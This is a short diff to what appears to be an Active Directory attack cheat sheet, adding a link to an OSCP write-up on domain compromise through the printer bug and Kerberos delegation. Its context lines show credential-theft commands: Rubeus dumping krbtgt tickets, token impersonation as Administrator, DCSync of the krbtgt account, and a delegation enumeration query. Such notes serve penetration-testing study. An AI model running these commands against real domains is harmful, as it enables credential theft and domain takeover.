@@ -254,6 +254,7 @@ The "Printer Bug"
 Assembly /assemblyname:"Rubeus" /parameters:"dump /service:krbtgt"
 MakeToken Administrator CYBER DoesNotMatter
 DCSync CYBER\krbtgt
+https://github.com/blackc03r/OSCP-Cheatsheets/blob/master/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation.md
 
 Constrained Delegation
 PowerShell Get-DomainComputer -TrustedToAuth -Properties DnsHostName, MSDS-AllowedToDelegateTo
